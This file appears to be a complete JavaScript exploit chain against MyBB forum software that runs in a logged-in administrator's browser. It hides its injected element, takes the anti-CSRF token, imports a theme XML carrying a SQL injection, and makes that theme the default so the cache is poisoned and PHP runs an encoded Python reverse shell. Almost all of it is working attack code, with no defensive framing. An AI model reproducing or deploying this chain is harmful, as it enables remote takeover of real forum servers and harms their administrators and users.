const REVERSE_SHELL_IP = "localhost";
const REVERSE_SHELL_PORT = 5554;

const PAYLOAD_XML_NAME = "payload";
const PAYLOAD_XML_VERSION = "1821";

const XML_PROLOG = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";

const SHELL_PAYLOAD = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + REVERSE_SHELL_IP + "\"," + REVERSE_SHELL_PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
const SQL_PAYLOAD = "') AND 1=0 UNION SELECT title, '${passthru(base64_decode(\\'" + btoa(SHELL_PAYLOAD) + "\\'))}' from mybb_templates -- ";


// Trigger the actual vulnerability, force cache reload.
// Stage: Final
function trigger() {
    var request = new XMLHttpRequest();

    request.open('GET', '/index.php');
    request.send();
}


// Poison the cache.
// Stage: 6
function set_as_default(token, tid) {

    var request = new XMLHttpRequest();

    request.open('GET', '/admin/index.php?module=style-themes&action=set_default&tid=' + tid + '&my_post_key=' + token);

    request.onload = function() { trigger(); };

    request.send();
}

// Get the TID of the downloaded theme payload
// Stage: 5
function get_payload_tid(token) {
    var request = new XMLHttpRequest();

    request.open('GET', '/admin/index.php?module=style-themes');

    request.responseType = "document";

    request.onload = function() { 
        
        var response = request.response;

        var aTags = response.getElementsByTagName("a");
        var searchText = "payload";
        var found;

        for (var i = 0; i < aTags.length; i++) {
            if (aTags[i].textContent == searchText) {
                found = aTags[i];
                break;
            }
        }

        var href = found.getAttribute("href");

        var urlParams = new URLSearchParams(href);

        var tid = urlParams.get("tid");
    

        set_as_default(token, tid); 
    };

    request.send();

}


// We pass the actual request to upload the template exploiting the second link of the exploit chain
// Stage: 4
function upload_template(token) {

    var request = new XMLHttpRequest();

    request.open('POST', '/admin/index.php?module=style-themes&action=import');

    var data = new FormData();

    data.append('my_post_key', token);
    data.append('local_file', build_payload(), PAYLOAD_XML_NAME + ".xml");
    data.append('import', 0);
    data.append('url', '');
    data.append('tid', '1');
    data.append('name', "payload");
    data.append("version_compat", 1);
    data.append("import_stylesheets", 1);
    data.append("import_templates", 1);

    request.onload = function() { 
        // After uploading the template, set it as default to poison the cache
        get_payload_tid(token)
    };


    request.send(data);
}


// Build the rogue XML Template exploiting SQL Injection leading to RCE through PHP evaluation.
// Stage: 3
function build_payload() {
    var xmlDom = document.implementation.createDocument("", "", null);
    
    var theme = xmlDom.createElement("theme");
    theme.setAttribute("name", PAYLOAD_XML_NAME);
    theme.setAttribute("version", PAYLOAD_XML_VERSION);

    var properties = xmlDom.createElement("properties");
    theme.appendChild(properties);

    var template_set = xmlDom.createElement("templateset");
    template_set.innerHTML = SQL_PAYLOAD;
    properties.appendChild(template_set);

    xmlDom.appendChild(theme);

    var serialized = new XMLSerializer().serializeToString(xmlDom);

    var result = XML_PROLOG + serialized;
    var file = new File([result], PAYLOAD_XML_NAME);
    
    return file;
}


// Acquire the anti-CSRF token 
// Stage: 2
function acquire_token(request) {

    var response = request.response;
    var token = response.getElementsByName("my_post_key")[0].value;

    if(token == null) { 
        /* ACP Session either expired or wasn't established to begin with */
        return;
    }

    // We have acquired the anti-CSRF token now.
    upload_template(token);
}


// ACP Code Execution
// Stage: 1
function exec_acp() {
    
    var request = new XMLHttpRequest();

    request.open('GET', 'admin/index.php?module=style-themes&action=import');
    request.responseType = "document";

    request.onload = function() { 
        acquire_token(request); 
    };

    request.send();
}


// We hide the payload, to raise less suspicions
// Stage: 0
function hide() {

    var getAll = document.querySelectorAll("[src*='http://xyzsomething.com/image?)<a href=']");

    getAll.forEach(element => {
        var pNode = element.parentNode.innerText="lmao whatever you say";
    });
    
}

// Entry point of the exploit
function start() {
    hide();
    exec_acp();  
}


start();
            